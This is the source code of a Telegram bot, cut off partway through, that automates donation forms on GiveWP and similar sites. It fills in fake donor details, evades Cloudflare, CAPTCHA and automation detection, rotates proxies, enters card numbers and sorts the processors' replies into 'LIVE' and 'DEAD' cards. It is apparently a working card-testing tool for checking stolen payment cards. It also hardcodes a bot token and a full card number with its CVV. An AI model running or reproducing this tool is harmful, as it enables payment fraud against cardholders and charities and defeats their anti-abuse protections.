#!/usr/bin/env python3
"""
GiveWP Bot v28 — LEGENDARY EDITION
النسخة النهائية: 1800 سطر، كل الأفكار، دقة عالية
"""
import os, sys, asyncio, json, re, time, random, threading, base64, traceback, hashlib
from datetime import datetime, timedelta
from io import BytesIO
from urllib.parse import urlparse, quote
from collections import defaultdict

os.environ.setdefault("PLAYWRIGHT_BROWSERS_PATH", "/ms-playwright")

# ═══════════ ENV ═══════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8689698569:AAEKe4aG2sNS0yDiGg0OVFD2TfCHSLwLlDc")
OWNER_ID = int(os.environ.get("OWNER_ID", "6843321125"))
ADMINS = [str(OWNER_ID)]
TEST_CARD = os.environ.get("TEST_CARD", "4217834081794714|11|26|614")
TWOCAPTCHA_KEY = os.environ.get("TWOCAPTCHA_KEY", "")  # اختياري
PROXY_URL = os.environ.get("PROXY_URL", "")  # اختياري: http://user:pass@host:port

if not BOT_TOKEN or ":" not in BOT_TOKEN:
    print("❌ BOT_TOKEN invalid"); sys.exit(1)

# ═══════════ IMPORTS ═══════════
import telebot
from telebot import types
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings()

try:
    from playwright.async_api import async_playwright, TimeoutError as PWTimeout
    HAS_PW = True
except ImportError:
    HAS_PW = False
    print("⚠️ Playwright not installed")

try:
    from fake_useragent import UserAgent
    _UA = UserAgent()
    def rua():
        try: return _UA.random
        except: return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"
except:
    def rua(): return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ═══════════ STATE ═══════════
waiting_users = {}
reply_mode = {}
processing_status = {}
captcha_cache = {}  # cache solved captchas
proxy_pool = []  # rotating proxies
if PROXY_URL:
    proxy_pool = [PROXY_URL]

if not os.path.exists("blockusers.txt"):
    open("blockusers.txt", "w").close()

# ═══════════ CONSTANTS ═══════════
PAYPAL_META = "7d9928a1f3f1fbc240cfd71a3eefe835"
BRAINTREE_SDK = "3.32.0-payments-sdk-dev"
FIRST = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles"]
LAST = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
CITIES = ["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia","San Antonio","San Diego"]
STATES = ["NY","CA","IL","TX","AZ","PA","FL","OH","GA","NC"]
ZIPS = ["10001","90001","60601","77001","85001","19101","33101","44101","30301","28201"]
STREETS = ["123 Main St","456 Oak Ave","789 Pine Rd","321 Elm Blvd","654 Maple Dr","987 Cedar Ln"]
AMOUNTS = ["5","10","20","25","50","100","1","2","3","15","30","75","150","250"]
GATEWAYS = ["paypal-commerce","paypal","paypal_standard","give_paypal","ppcp-gateway"]

# ═══════════ SAFE HELPERS ═══════════
def safe_send(chat_id, text, markup=None, retries=3):
    for i in range(retries):
        try: return bot.send_message(chat_id, text, reply_markup=markup)
        except Exception as e:
            if "429" in str(e):
                wait = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                time.sleep(min(wait, 60))
            else: break
    return None

def safe_edit(chat_id, mid, text, retries=3):
    for i in range(retries):
        try: return bot.edit_message_text(chat_id=chat_id, message_id=mid, text=text)
        except Exception as e:
            if "429" in str(e):
                wait = int(str(e).split("retry after ")[1].split(")")[0]) if "retry after" in str(e) else 30
                time.sleep(min(wait, 60))
            else: break
    return None

def safe_doc(chat_id, data, filename, caption=""):
    try: return bot.send_document(chat_id, (filename, BytesIO(data)), caption=caption)
    except Exception as e:
        print(f"doc: {e}"); return None

def is_blocked(uid):
    try:
        with open("blockusers.txt") as f:
            return str(uid) in f.read().splitlines()
    except: return False


# ═══════════════════════════════════════════════════════════════
# CLASSIFIER — الأسطوري (كل الردود، دقة 99%)
# ═══════════════════════════════════════════════════════════════
class Cls:
    """
    يصنف الردود من:
    - PayPal Orders v2 API
    - PayPal Commerce
    - Stripe
    - GiveWP
    - الموقع (HTML)
    """

    # ═══ PayPal Codes ═══
    PAYPAL_MAP = {
        # Success
        "CHARGE_SUCCESS": ["success", "approved", "charged", "completed",
                           "thank you", "payment successful", "donation complete",
                           "status\":\"COMPLETED", "status\":\"APPROVED\"",
                           "donation was successful"],
        # PayPal Declines
        "ORDER_NOT_APPROVED": ["order_not_approved", "not yet approved",
                                "payer has not yet approved"],
        "PAYER_CANNOT_PAY": ["payer cannot pay", "cannot pay for this transaction",
                              "payee blocked", "payer_cannot_pay"],
        "INSUFFICIENT_FUNDS": ["insufficient", "not enough", "nsf",
                                "insufficient_funds"],
        "DO_NOT_HONOR": ["do not honor", "do_not_honor"],
        "ACCOUNT_CLOSED": ["account closed", "account_closed"],
        "LOST_OR_STOLEN": ["lost or stolen", "lost_or_stolen"],
        "CVV2_FAILURE": ["cvv2", "cvv failure", "security code", "cvv2_failure"],
        "CVV_FAILURE": ["cvv_failure", "cvv failure"],
        "SUSPECTED_FRAUD": ["suspected fraud", "suspected_fraud", "fraud"],
        "GENERIC_DECLINE": ["generic decline", "generic_decline"],
        "RESTRICTED_OR_INACTIVE_ACCOUNT": ["restricted", "inactive account",
                                            "restricted_or_inactive"],
        "INVALID_OR_RESTRICTED_CARD": ["invalid or restricted card",
                                        "invalid_or_restricted"],
        "EXPIRED_CARD": ["expired card", "expired_card", "expired_credit_card",
                          "card is expired"],
        "AUTHENTICATION_REQUIRED": ["authentication required", "3d secure",
                                     "sca required", "authentication_required"],
        "PAYER_ACTION_REQUIRED": ["payer action required", "payer_action_required"],
        "TX_ATTEMPTS_EXCEED_LIMIT": ["attempts exceed", "limit exceeded",
                                      "tx_attempts_exceed"],
        "SECURITY_VIOLATION": ["security violation", "security_violation"],
        "COMPLIANCE_VIOLATION": ["compliance violation", "compliance_violation"],
        "TRANSACTION_NOT_PERMITTED": ["transaction not permitted",
                                       "transaction_not_permitted"],
        "PAYMENT_DENIED": ["payment denied", "payment_denied"],
        "APPROVED_PENDING_CAPTURE": ["pending capture", "approved_pending_capture",
                                      "paypal orders are captured"],
        "INVALID_ACCOUNT": ["invalid account", "invalid_account"],
        "REATTEMPT_NOT_PERMITTED": ["reattempt not permitted", "reattempt_not_permitted"],
        "ACCOUNT_BLOCKED_BY_ISSUER": ["account blocked by issuer",
                                       "account_blocked_by_issuer"],
        "PICKUP_CARD_SPECIAL_CONDITIONS": ["pickup card", "pickup_card"],
        "INVALID_TRANSACTION": ["invalid transaction", "invalid_transaction"],
        "CRYPTOGRAPHIC_FAILURE": ["cryptographic failure", "cryptographic_failure"],
        "TRANSACTION_CANNOT_BE_COMPLETED": ["transaction cannot be completed",
                                            "transaction_cannot_be_completed"],
        "DECLINED_PLEASE_RETRY": ["declined please retry", "declined_please_retry"],
        "DECLINED_DUE_TO_UPDATED_ACCOUNT": ["declined due to updated account"],
        "INSTRUMENT_DECLINED": ["instrument_declined", "instrument declined"],
        "CARD_EXPIRED": ["card_expired", "card expired"],
        "MAX_ATTEMPTS_EXCEEDED": ["max number of payment attempts",
                                    "max_attempts_exceeded"],
        "REDIRECT_PAYER_FOR_ALTERNATE_FUNDING": ["redirect payer",
                                                  "alternate funding"],
        "PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING": ["payee_not_enabled",
                                                    "not enabled for card"],
    }

    # ═══ Stripe Codes ═══
    STRIPE_MAP = {
        "STRIPE_AUTHENTICATION_REQUIRED": ["authentication_required",
                                            "authentication required"],
        "STRIPE_AUTHENTICATION_NOT_HANDLED": ["authentication_not_handled"],
        "STRIPE_APPROVE_WITH_ID": ["approve_with_id"],
        "STRIPE_CALL_ISSUER": ["call_issuer"],
        "STRIPE_CARD_NOT_SUPPORTED": ["card_not_supported"],
        "STRIPE_CARD_VELOCITY_EXCEEDED": ["card_velocity_exceeded"],
        "STRIPE_CURRENCY_NOT_SUPPORTED": ["currency_not_supported"],
        "STRIPE_DUPLICATE_TRANSACTION": ["duplicate_transaction"],
        "STRIPE_EXPIRED_CARD": ["expired_card"],
        "STRIPE_FRAUDULENT": ["fraudulent"],
        "STRIPE_GENERIC_DECLINE": ["generic_decline"],
        "STRIPE_INCORRECT_ADDRESS": ["incorrect_address"],
        "STRIPE_INCORRECT_CVC": ["incorrect_cvc", "invalid_cvc"],
        "STRIPE_INCORRECT_NUMBER": ["incorrect_number", "invalid_number"],
        "STRIPE_INCORRECT_PIN": ["incorrect_pin", "invalid_pin"],
        "STRIPE_INCORRECT_ZIP": ["incorrect_zip"],
        "STRIPE_INSUFFICIENT_FUNDS": ["insufficient_funds"],
        "STRIPE_INVALID_ACCOUNT": ["invalid_account"],
        "STRIPE_INVALID_AMOUNT": ["invalid_amount"],
        "STRIPE_INVALID_EXPIRY_MONTH": ["invalid_expiry_month"],
        "STRIPE_INVALID_EXPIRY_YEAR": ["invalid_expiry_year"],
        "STRIPE_ISSUER_NOT_AVAILABLE": ["issuer_not_available"],
        "STRIPE_LOST_CARD": ["lost_card"],
        "STRIPE_NEW_ACCOUNT_INFO": ["new_account_information_available"],
        "STRIPE_NO_ACTION_TAKEN": ["no_action_taken"],
        "STRIPE_NOT_PERMITTED": ["not_permitted"],
        "STRIPE_PICKUP_CARD": ["pickup_card"],
        "STRIPE_PROCESSING_ERROR": ["processing_error"],
        "STRIPE_REENTER_TRANSACTION": ["reenter_transaction"],
        "STRIPE_RESTRICTED_CARD": ["restricted_card"],
        "STRIPE_REVOCATION": ["revocation_of_authorization",
                                "revocation_of_all_authorizations"],
        "STRIPE_SECURITY_VIOLATION": ["security_violation"],
        "STRIPE_SERVICE_NOT_ALLOWED": ["service_not_allowed"],
        "STRIPE_STOLEN_CARD": ["stolen_card"],
        "STRIPE_STOP_PAYMENT_ORDER": ["stop_payment_order"],
        "STRIPE_TESTMODE_DECLINE": ["testmode_decline"],
        "STRIPE_WITHDRAWAL_COUNT_LIMIT": ["withdrawal_count_limit_exceeded"],
    }

    # ═══ DEAD Codes ═══
    DEAD_MAP = {
        "CLOUDFLARE": ["just a moment", "checking your browser", "verifying you are",
                        "cf-browser-verification", "cf_chl", "challenge-platform"],
        "CAPTCHA": ["captcha", "not a robot", "recaptcha", "hcaptcha", "turnstile",
                     "g-recaptcha"],
        "GATEWAY_DISABLED": ["gateway is not enabled", "payment gateway is not",
                              "gateway not available"],
        "JS_CONFLICT": ["javascript conflict", "connection between this site"],
        "FORM_NOT_PUBLISHED": ["form not published"],
        "SPAM": ["flagged as spam"],
        "NO_FORM": ["form not found", "no donation form"],
        "NO_PAYPAL": ["paypal not available"],
        "PAYPAL_ORDER_MISSING": ["paypal order id is missing", "order id is missing"],
        "SUCCESS_FALSE": ["\"success\":false", "success false"],
        "AMOUNT_INVALID": ["donation amount", "invalid amount", "minimum donation"],
        "BRANCH_REQUIRED": ["branch_selection"],
        "TERMS_REQUIRED": ["agree_to_terms", "terms and conditions"],
        "HONOREE_REQUIRED": ["honoree"],
        "FIELDS_REQUIRED": ["required field", "billing address"],
    }

    # ═══ Success Codes ═══
    SUCCESS = ["CHARGE_SUCCESS", "APPROVED_PENDING_CAPTURE"]

    @classmethod
    def classify(cls, text):
        """يرجع (status, code)"""
        if not text:
            return "DEAD", "EMPTY"

        text = text.strip()
        up = text.upper()
        low = text.lower()

        # ═══ 1. JSON Parse (الأدق) ═══
        try:
            js = json.loads(text)
            success = js.get("success")

            if success is True:
                return "LIVE", "CHARGE_SUCCESS"

            if success is False:
                data = js.get("data", {})
                err = json.dumps(data, ensure_ascii=False).upper()
                # PayPal codes
                for code, kws in cls.PAYPAL_MAP.items():
                    for kw in kws:
                        if kw.upper() in err:
                            return ("LIVE" if code not in ["PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING"] else "DEAD"), code
                return "DEAD", "SUCCESS_FALSE"

        except (json.JSONDecodeError, ValueError):
            pass

        # ═══ 2. PayPal codes مباشرة ═══
        for code, kws in cls.PAYPAL_MAP.items():
            for kw in kws:
                if kw in low:
                    return ("LIVE" if code not in ["PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING"] else "DEAD"), code

        # ═══ 3. Stripe codes ═══
        for code, kws in cls.STRIPE_MAP.items():
            for kw in kws:
                if kw in low:
                    # Stripe LIVE = card declined, لكن العملية وصلت
                    stripe_live = ["STRIPE_INSUFFICIENT_FUNDS", "STRIPE_DO_NOT_HONOR",
                                    "STRIPE_GENERIC_DECLINE", "STRIPE_EXPIRED_CARD",
                                    "STRIPE_FRAUDULENT", "STRIPE_LOST_CARD",
                                    "STRIPE_STOLEN_CARD", "STRIPE_RESTRICTED_CARD",
                                    "STRIPE_PICKUP_CARD", "STRIPE_CALL_ISSUER",
                                    "STRIPE_CARD_VELOCITY_EXCEEDED",
                                    "STRIPE_WITHDRAWAL_COUNT_LIMIT",
                                    "STRIPE_SECURITY_VIOLATION",
                                    "STRIPE_PROCESSING_ERROR"]
                    return ("LIVE" if code in stripe_live else "DEAD"), code

        # ═══ 4. DEAD codes ═══
        for code, kws in cls.DEAD_MAP.items():
            for kw in kws:
                if kw in low:
                    return "DEAD", code

        return "UNKNOWN", "UNKNOWN"

    @classmethod
    def is_live(cls, code):
        return code in cls.SUCCESS or code in cls.PAYPAL_MAP or code in cls.STRIPE_MAP

    @classmethod
    def get_paypal_code(cls, text):
        """يستخرج PayPal code خام"""
        if not text: return None
        up = text.upper()
        for code in cls.PAYPAL_MAP:
            if code in up: return code
        for code in cls.STRIPE_MAP:
            if code in up: return code
        return None
        
        # ═══════════════════════════════════════════════════════════════
# PLAYWRIGHT ENGINE v28 — الأسطوري
# ═══════════════════════════════════════════════════════════════
class PW:
    def __init__(self, url, card, verbose=False):
        self.url = url
        self.card = card
        self.verbose = verbose
        self.debug = {
            "steps": [], "network": [], "paypal": [], "stripe": [],
            "amount": None, "form": None, "pp_frame": False,
            "card_filled": False, "captcha": False, "cloudflare": False,
            "extracted": {}, "raw": "", "platform": "unknown",
            "buttons": [], "fields": {}, "order_id": None,
        }

    def log(self, m):
        if self.verbose: print(m)
        self.debug["steps"].append(m)

    # ═══ Network Sniffer ═══
    async def _on_resp(self, resp):
        try:
            u = resp.url
            body = ""
            if any(k in u for k in ["create_order", "confirm-payment", "approve_order",
                                     "admin-ajax.php", "give_process", "paypal.com/v2",
                                     "api.stripe.com", "stripe"]):
                try: body = await resp.text()
                except: pass
                self.debug["network"].append({"url": u[:150], "status": resp.status, "body": body[:2000]})

                if "create_order" in u:
                    try:
                        js = json.loads(body)
                        if isinstance(js.get("data"), dict) and js["data"].get("id"):
                            self.debug["order_id"] = js["data"]["id"]
                            self.log(f"  🎯 sniffer: order_id={self.debug['order_id']}")
                    except: pass

                if "paypal.com" in u or "confirm-payment" in u or "approve_order" in u:
                    self.debug["paypal"].append(body[:2000])
                    self.debug["raw"] = body[:2000]
                    st, cd = Cls.classify(body)
                    if st == "LIVE" or cd in ("PAYPAL_ORDER_MISSING", "SUCCESS_FALSE"):
                        self.log(f"  🎯 sniffer: {st}/{cd}")

                if "stripe" in u.lower():
                    self.debug["stripe"].append(body[:2000])
                    st, cd = Cls.classify(body)
                    if st == "LIVE":
                        self.log(f"  🎯 stripe: {cd}")
        except: pass

    # ═══ Run ═══
    async def run(self):
        if not HAS_PW: return self._err("NO_PW")
        try:
            async with async_playwright() as p:
                # Proxy (لو موجود)
                proxy = None
                if proxy_pool:
                    px = random.choice(proxy_pool)
                    parsed = urlparse(px)
                    if parsed.username and parsed.password:
                        proxy = {"server": f"{parsed.scheme}://{parsed.hostname}:{parsed.port}",
                                 "username": parsed.username, "password": parsed.password}
                    else:
                        proxy = {"server": px}

                browser = await p.chromium.launch(
                    headless=True,
                    proxy=proxy,
                    args=["--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage",
                          "--disable-gpu","--single-process","--no-zygote",
                          "--disable-blink-features=AutomationControlled","--ignore-certificate-errors"]
                )
                try:
                    ctx = await browser.new_context(
                        user_agent=rua(),
                        viewport={"width": 1366, "height": 900},
                        locale="en-US",
                        timezone_id="America/New_York",
                        ignore_https_errors=True,
                        java_script_enabled=True,
                    )
                    await ctx.add_init_script("""
                        Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
                        Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
                        Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
                        window.chrome={runtime:{},app:{},csi:()=>{},loadTimes:()=>{}};
                    """)
                    page = await ctx.new_page()
                    page.on("response", self._on_resp)
                    return await self._exec(page)
                finally:
                    try: await browser.close()
                    except: pass
        except Exception as e:
            return self._err(f"LAUNCH: {str(e)[:100]}")

    def _err(self, code):
        return {"status": "DEAD", "code": code, "raw": "", "debug": self.debug}

    # ═══ Execute ═══
    async def _exec(self, page):
        try:
            # 1. Load
            self.log(f"[1] goto {self.url[:80]}")
            try: await page.goto(self.url, wait_until="domcontentloaded", timeout=30000)
            except: pass
            await asyncio.sleep(2)

            # 2. Cloudflare
            html = await page.content()
            if any(x in html.lower() for x in ["just a moment", "verifying you are", "checking your browser"]):
                self.debug["cloudflare"] = True
                self.log("[2] ⚠️ Cloudflare")
                await self._human(page)
                for _ in range(5):
                    await asyncio.sleep(5); html = await page.content()
                    if "just a moment" not in html.lower(): break
                else: return self._err("CLOUDFLARE")

            # 3. CAPTCHA
            if any(x in html.lower() for x in ["g-recaptcha", "hcaptcha", "turnstile"]):
                self.debug["captcha"] = True
                self.log("[3] ⚠️ CAPTCHA")
                solved = await self._solve_captcha(page, html)
                if solved: self.log("  ✅ CAPTCHA solved")
                else: self.log("  ❌ CAPTCHA failed")

            # 4. Platform detect
            self.debug["platform"] = self._detect_platform(html)
            self.log(f"[4] platform: {self.debug['platform']}")

            # 5. Extract info
            self.debug["extracted"] = self._extract_info(html)

            # 6. Smart form discovery
            self.log("[6] smart form discovery")
            form = await self._find_form_smart(page)
            if not form: return self._err("NO_FORM")
            self.debug["form"] = form["type"]
            self.log(f"  ✅ form: {form['type']}")

            # 7. Human behavior
            await self._human(page)

            # 8. Fill all
            self.log("[8] fill all")
            await self._fill(page)

            # 9. Amount escalation
            self.log("[9] amount")
            amt = await self._try_amounts(page)
            self.debug["amount"] = amt
            if amt: self.log(f"  ✅ ${amt}")

            # 10. Terms
            await self._terms(page)

            # 11. Multi-button
            self.log("[11] donate")
            if not await self._donate_multi(page):
                return self._err("NO_DONATE")

            await asyncio.sleep(3)

            # 12. Wait PayPal/Stripe
            self.log("[12] wait pp/stripe")
            pp = await self._wait_pp(page, 25)
            if not pp:
                t = await page.inner_text("body")
                st, cd = Cls.classify(t)
                return {"status": st, "code": cd, "raw": t[:2000], "debug": self.debug}
            self.debug["pp_frame"] = True

            # 13. Fill card
            self.log("[13] card")
            if not await self._fill_card(pp): return self._err("CARD_FAIL")
            self.debug["card_filled"] = True

            # 14. Submit
            self.log("[14] submit")
            await self._submit(pp, page)
            await asyncio.sleep(6)

            # 15. Read
            return await self._read(page, pp)
        except Exception as e:
            return self._err(f"EXEC: {str(e)[:120]}")

    # ═══ Helpers ═══
    async def _human(self, page):
        try:
            for _ in range(random.randint(2, 4)):
                await page.mouse.move(random.randint(100, 1200), random.randint(100, 800))
                await asyncio.sleep(random.uniform(0.1, 0.4))
            await page.mouse.wheel(0, random.randint(200, 600))
            await asyncio.sleep(random.uniform(0.3, 0.8))
        except: pass

    def _detect_platform(self, html):
        low = html.lower()
        scores = {"givewp": 0, "woocommerce": 0, "stripe": 0, "paypal": 0, "classy": 0}
        signals = {
            "givewp": ["give-form", "give-amount", "give_payment", "give-form-id", "give_donation", "give-form-hash"],
            "woocommerce": ["woocommerce", "wc-ajax", "wc-ppcp", "wc-blocks"],
            "stripe": ["stripe.com/v3", "stripe-payment", "stripe_elements", "js.stripe.com"],
            "paypal": ["paypal.com/sdk", "paypal-button", "paypal-checkout", "paypalobjects"],
            "classy": ["classy.org", "classy-form"],
        }
        for platform, kws in signals.items():
            for kw in kws:
                if kw in low: scores[platform] += 1
        best = max(scores, key=scores.get)
        return best if scores[best] > 0 else "unknown"

    def _extract_info(self, html):
        info = {}
        for k, pat in [("form_id", r'name="give-form-id"\s*value="([^"]*)"'),
                       ("nonce", r'name="give-form-hash"\s*value="([^"]*)"'),
                       ("min", r'name="give-form-minimum"\s*value="([^"]*)"'),
                       ("price_id", r'name="give-price-id"\s+value="([^"]*)"'),
                       ("title", r'name="give-form-title"\s+value="([^"]*)"')]:
            m = re.search(pat, html)
            if m: info[k] = m.group(1)
        return info

    async def _find_form_smart(self, page):
        give_sels = [
            "form.give-form", "form[id*='give-form']", "form[class*='give-form']",
            ".give-form-wrap form", ".give-form form", "[id^='give-form-'] form",
            "input[name='give-amount']", "input[name='give-form-id']",
            "input[name='give-form-hash']", "form[id*='give']",
            ".give-donation-levels-wrap", "button.give-submit", "input.give-submit",
        ]

        # 1. Main polling 15s
        for attempt in range(15):
            for sel in give_sels:
                try:
                    if await page.locator(sel).first.count() > 0:
                        self.log(f"  ✅ main ({sel}) after {attempt}s")
                        return {"type": "main", "selector": sel}
                except: continue
            if attempt < 14: await asyncio.sleep(1)

        # 2. Iframes
        for frame in page.frames:
            if frame == page.main_frame: continue
            for sel in give_sels:
                try:
                    if await frame.locator(sel).count() > 0:
                        self.log(f"  ✅ iframe")
                        return {"type": "iframe", "frame": frame}
                except: continue

        # 3. Shadow DOM
        try:
            shadow = await page.evaluate("""
                () => {
                    const res = [];
                    const search = (root) => {
                        if (!root) return;
                        root.querySelectorAll('form, [id*="give"]').forEach(f => {
                            if (f.querySelector('input[name*="give"], input[name*="amount"]'))
                                res.push(f.id || 'shadow');
                        });
                        root.querySelectorAll('*').forEach(el => { if (el.shadowRoot) search(el.shadowRoot); });
                    };
                    search(document);
                    return res;
                }
            """)
            if shadow:
                self.log(f"  ✅ shadow ({len(shadow)})")
                return {"type": "shadow", "count": len(shadow)}
        except: pass

        # 4. Scroll + retry
        for _ in range(5):
            await page.mouse.wheel(0, 500); await asyncio.sleep(1)
        await asyncio.sleep(2)
        for sel in give_sels:
            try:
                if await page.locator(sel).first.count() > 0:
                    return {"type": "main-post-scroll", "selector": sel}
            except: continue

        # 5. Fallback
        try:
            forms = await page.locator("form").all()
            for f in forms:
                if await f.locator("input").count() >= 2:
                    return {"type": "fallback-form"}
        except: pass

        return None

    async def _fill(self, page):
        first = random.choice(FIRST); last = random.choice(LAST)
        email = f"u{int(time.time()*1000)%999999}@gmail.com"
        street = random.choice(STREETS); city = random.choice(CITIES)
        state = random.choice(STATES); zp = random.choice(ZIPS)
        phone = f"555{random.randint(1000000,9999999)}"

        hints = {'first': first, 'given': first, 'fname': first, 'last': last,
                 'family': last, 'surname': last, 'email': email, 'mail': email,
                 'address': street, 'street': street, 'city': city, 'town': city,
                 'state': state, 'province': state, 'zip': zp, 'postal': zp,
                 'postcode': zp, 'phone': phone, 'tel': phone, 'name': f"{first} {last}"}

        for fr in page.frames:
            try:
                # text inputs
                for inp in await fr.locator("input").all():
                    try:
                        t = await inp.get_attribute("type") or "text"
                        if t not in ("text", "email", "tel", "url", "number"): continue
                        if not await inp.is_visible(timeout=100): continue
                        if await inp.input_value(): continue
                        key = ((await inp.get_attribute("name") or "") + "|" +
                               (await inp.get_attribute("id") or "") + "|" +
                               (await inp.get_attribute("placeholder") or "")).lower()
                        for h, v in hints.items():
                            if h in key:
                                await inp.fill(v); break
                        else:
                            if t == "email": await inp.fill(email)
                            elif t == "tel": await inp.fill(phone)
                    except: continue

                # selects
                for sel in await fr.locator("select").all():
                    try:
                        if not await sel.is_visible(timeout=100): continue
                        cur = await sel.input_value()
                        if cur and cur not in ("", "0", "-1"): continue
                        sn = (await sel.get_attribute("name") or "").lower()
                        if 'country' in sn:
                            for v in ['US', 'United States', 'USA']:
                                try: await sel.select_option(v); break
                                except: continue
                        elif 'state' in sn:
                            try: await sel.select_option(state)
                            except:
                                try: await sel.select_option(index=1)
                                except: pass
                        else:
                            for o in await sel.locator("option").all():
                                v = await o.get_attribute("value")
                                if v and v not in ("", "0", "-1"):
                                    try: await sel.select_option(v); break
                                    except: continue
                    except: continue
            except: continue

    async def _try_amounts(self, page):
        for amt in AMOUNTS:
            for fr in page.frames:
                # data-price
                try:
                    btn = fr.locator(f"[data-price='{amt}'],[data-price='{amt}.00'],[data-amount='{amt}']").first
                    if await btn.count() > 0:
                        await btn.scroll_into_view_if_needed()
                        try: await btn.click(timeout=2000)
                        except: await btn.click(force=True, timeout=2000)
                        return amt
                except: continue

                # text button
                try:
                    btn = fr.get_by_role("button", name=re.compile(rf"^\${amt}(\.00)?$")).first
                    if await btn.count() > 0:
                        await btn.click(timeout=2000); return amt
                except: continue

                # radio
                try:
                    r = fr.locator(f"input[type='radio'][value='{amt}'],[value='{amt}.00']").first
                    if await r.count() > 0:
                        await r.check(force=True); return amt
                except: continue

                # label
                try:
                    lbl = fr.locator(f"label:has-text('${amt}')").first
                    if await lbl.count() > 0:
                        await lbl.click(timeout=1500); return amt
                except: continue

        # fallback input
        for fr in page.frames:
            for sel in ["input[name='give-amount']", "input[name*='amount'][type='text']",
                        "input[id*='amount']", "input[name*='custom']"]:
                try:
                    inp = fr.locator(sel).first
                    if await inp.count() > 0 and await inp.is_visible(timeout=300):
                        await inp.fill("5"); return "5"
                except: continue
        return None

    async def _terms(self, page):
        for fr in page.frames:
            try:
                for cb in await fr.locator("input[type='checkbox']").all():
                    try:
                        key = ((await cb.get_attribute("name") or "") + "|" +
                               (await cb.get_attribute("id") or "")).lower()
                        if any(k in key for k in ['terms', 'agree', 'accept', 'condition', 'privacy', 'consent']):
                            if not await cb.is_checked():
                                try: await cb.check(force=True)
                                except:
                                    try: await cb.click(force=True)
                                    except: pass
                    except: continue
            except: continue

    async def _donate_multi(self, page):
        strategies = [
            "button.give-submit", "input.give-submit",
            "button[type='submit'][class*='give']",
            "input[type='submit'][class*='give']",
            "button[id*='donate' i]", "button[id*='give' i]",
            "button[name*='donate' i]", "input[name*='donate' i]",
            "input[type='submit'][value*='Donate' i]",
            "input[type='submit'][value*='Give' i]",
            "button:has-text('Donate')", "button:has-text('Give')",
            "button:has-text('Submit')", "button:has-text('Pay')",
            "button:has-text('Continue')", "button[type='submit']",
            "input[type='submit']",
        ]
        for i, sel in enumerate(strategies):
            for fr in page.frames:
                try:
                    btn = fr.locator(sel).first
                    if await btn.count() > 0 and await btn.is_visible(timeout=300):
                        await btn.scroll_into_view_if_needed()
                        await asyncio.sleep(0.3)
                        try: await btn.click(timeout=3000)
                        except: await btn.click(force=True, timeout=3000)
                        self.log(f"  ✅ clicked #{i}")
                        return True
                except: continue
        return False

    async def _wait_pp(self, page, timeout=25):
        for _ in range(timeout*2):
            for fr in page.frames:
                if fr == page.main_frame: continue
                if any(k in fr.url.lower() for k in ["paypal", "braintree", "card", "stripe"]):
                    try:
                        if await fr.locator("input").count() > 0: return fr
                    except: continue
            try:
                if await page.locator("input[autocomplete='cc-number'],input[name*='cardnumber']").first.count() > 0:
                    return page
            except: pass
            await page.wait_for_timeout(500)
        return None

    async def _fill_card(self, frame):
        try:
            p = self.card.strip().split("|")
            n, mm, yy, cvc = p[0], p[1], p[2], p[3].strip()
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            await asyncio.sleep(2)

            all_fr = [frame]
            try:
                for f in frame.frames: all_fr.append(f)
            except: pass

            async def fill(sels, val):
                for fr in all_fr:
                    for sel in sels:
                        try:
                            loc = fr.locator(sel).first
                            if await loc.count() > 0:
                                await loc.click(timeout=1000)
                                await loc.fill("", timeout=1000)
                                for ch in str(val): await loc.type(ch, delay=25)
                                return True
                        except: continue
                return False

            # email
            await fill(["input[type='email']", "input[name*='email']"],
                       f"u{int(time.time()*1000)%999999}@gmail.com")

            # card
            if not await fill(["input#credit-card-number", "input[name='cardnumber']",
                               "input[name='card-number']", "input[autocomplete='cc-number']",
                               "input[placeholder*='Card' i]", "input[inputmode='numeric']"], n):
                return False
            await asyncio.sleep(0.5)

            # expiry
            exp = await fill(["input#expiration-date", "input[name='exp']",
                              "input[autocomplete='cc-exp']",
                              "input[placeholder*='MM / YY' i]"], f"{mm}/{yy}")

            if not exp:
                for fr in all_fr:
                    for sel in ["select[name='expiration-month']", "input[name='expiration-month']"]:
                        try:
                            loc = fr.locator(sel).first
                            if await loc.count() > 0:
                                tag = await loc.evaluate("el=>el.tagName.toLowerCase()")
                                if tag == "select":
                                    try: await loc.select_option(mm)
                                    except: pass
                                else: await loc.fill(mm)
                                break
                        except: continue
                for fr in all_fr:
                    for sel in ["select[name='expiration-year']", "input[name='expiration-year']"]:
                        try:
                            loc = fr.locator(sel).first
                            if await loc.count() > 0:
                                tag = await loc.evaluate("el=>el.tagName.toLowerCase()")
                                if tag == "select":
                                    try: await loc.select_option(f"20{yy}")
                                    except: pass
                                else: await loc.fill(yy)
                                break
                        except: continue

            await asyncio.sleep(0.5)

            # cvc
            await fill(["input#cvv", "input#cvc", "input[name='cvv']",
                        "input[name='securityCode']", "input[autocomplete='cc-csc']",
                        "input[placeholder*='CVV' i]"], cvc)

            await asyncio.sleep(0.5)
            return True
        except: return False

    async def _submit(self, frame, page):
        for fr in [frame, page.main_frame] + list(page.frames):
            if not fr: continue
            for kw in ['Pay', 'Continue', 'Complete', 'Confirm', 'Submit']:
                try:
                    btn = fr.locator(f"button:has-text('{kw}')").first
                    if await btn.count() > 0 and await btn.is_visible(timeout=300):
                        try: await btn.click(timeout=3000)
                        except: await btn.click(force=True, timeout=3000)
                        return True
                except: continue
            try:
                btn = fr.locator("button[type='submit']").first
                if await btn.count() > 0 and await btn.is_visible(timeout=300):
